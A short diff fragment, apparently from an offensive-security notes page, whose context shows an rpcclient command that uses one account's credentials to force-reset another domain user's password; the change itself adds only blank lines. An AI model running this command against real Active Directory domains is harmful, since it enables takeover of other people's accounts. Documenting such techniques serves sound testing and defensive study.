@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:26:38.109512+00:00'
 ```bash
 rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd"
 ```
+
+
